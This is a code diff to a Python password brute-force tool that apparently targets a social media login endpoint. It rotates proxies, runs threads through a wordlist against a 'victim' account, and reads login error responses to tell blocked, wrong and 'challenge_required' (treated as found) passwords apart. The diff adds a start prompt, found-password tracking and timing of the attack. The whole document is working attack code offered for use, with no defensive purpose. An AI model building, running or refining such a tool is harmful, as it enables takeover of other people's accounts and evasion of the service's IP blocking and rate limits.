@@ -1,8 +1,8 @@
 from concurrent.futures import (ThreadPoolExecutor, as_completed)
-from time import strftime
+from time import sleep, strftime, time
 from .exceptions import (BlockedIP, FuckedLogin,WrongPassword)
 from .proxychecker import ProxyChecker
-from .console import Console,runnerBrute
+from .console import (Console,runnerBruteBanner)
 import uuid
 import random
 import requests
@@ -17,6 +17,7 @@ class Bruter:
         self.__proxy_type = proxy_type
         self.__victim = victim
         self.__ip = 0
+        self.__passw =""
         self.__readerwordlist
         self.__isFind = False
         self.__getproxy = []
@@ -37,8 +38,15 @@ class Bruter:
         if self.__getproxy == []:
             print("No Working Proxy Found!")
         else:
-            print(f"{Console.RED}target>{self.__victim}{Console.BANNER_BRUTE}")
-            self.__threadPool()
+            print(Console.BANNER_BRUTE)
+            _input = input(Console.COMMAND_LINE).lower()
+            if _input != 'x':
+                self.__threadPool()
+            else:
+                print('Byee')
+                sleep(1)
+                os.system("cls")
+                sys.exit(0)
 
     @property
     def __readerwordlist(self):
@@ -82,17 +90,19 @@ class Bruter:
                                     allow_redirects=True,data=__data,headers=__header,
                                     proxies=__proxies,timeout=timeout)
                 json_load = json.loads(s.text)
-                #print(f"{Console.GREEN}{json_load}{Console.DEFAULT}")
+                print(f"{Console.GREEN}{json_load}{Console.DEFAULT}")
                 if json_load["error_type"] == "ip_block":
                     self.__ip += 1 
                     raise BlockedIP()
             
                 if json_load["error_type"] == "bad_password":
                     self.__isFind = False
+                    self.__passw=passw
                     raise WrongPassword()
                 
                 if json_load["message"] == "challenge_required":
                     self.__isFind = True
+                    self.__passw=passw
                     raise FuckedLogin()
                 
                 if json_load["error_type"] == "rate_limit_error":
@@ -101,6 +111,7 @@ class Bruter:
                 pass
 
     def __threadPool(self):
+        first = time()
         with ThreadPoolExecutor(max_workers=None) as executor:
             future_to_password = {executor.submit(self.__login,passw,30): passw for passw in self.__readerwordlist}
             for future in as_completed(future_to_password):
@@ -109,15 +120,16 @@ class Bruter:
                     future.result()
                 except (BlockedIP,WrongPassword,FuckedLogin):
                     os.system("cls")
-                    print(runnerBrute(passw=value,words=len(list(self.__readerwordlist)),prxies=len(self.__getproxy),ip=self.__ip))
+                    print(runnerBruteBanner(target=self.__victim,passw="None" if self.__passw == '' else self.__passw,words=len(list(self.__readerwordlist)),prxies=len(self.__getproxy),ip=self.__ip))
                     if self.__isFind:
-                        print(f"{Console.DEFAULT}{Console.BOLD}\t?\n\t╰──────≻Password Found: {value}")
-                        sys.exit(0)
+                        print(f"{Console.DEFAULT}{Console.BOLD}\t?\n\t╰──────≻Password Found: {self.__passw}")
+                        executor.shutdown(wait=False)
+                        break
                 except (requests.exceptions.ConnectionError,requests.exceptions.ReadTimeout):
                     pass
-                    #os.system("cls")
-                    #print(runnerBrute(,self.__ip,len(list(self.__readerwordlist)),len(self.__getproxy)))
-
-        print(f"?\n╰──────≻Brute Force Attack is Complate{Console.DEFAULT}")
+        last = time()
+        now_time = int(last-first)
+        print(f"    {Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Brute Force Attack is Completed Attack lasted {str(now_time)+' seconds' if now_time < 60 else str((now_time/60).__round__(3))+' minute'}{Console.DEFAULT}")
         if self.__isFind == False:
-            print(f"\t{Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Password not found!{Console.DEFAULT}")
+            executor.shutdown(wait=False)
+            print(f"    {Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Password not found!{Console.DEFAULT}")
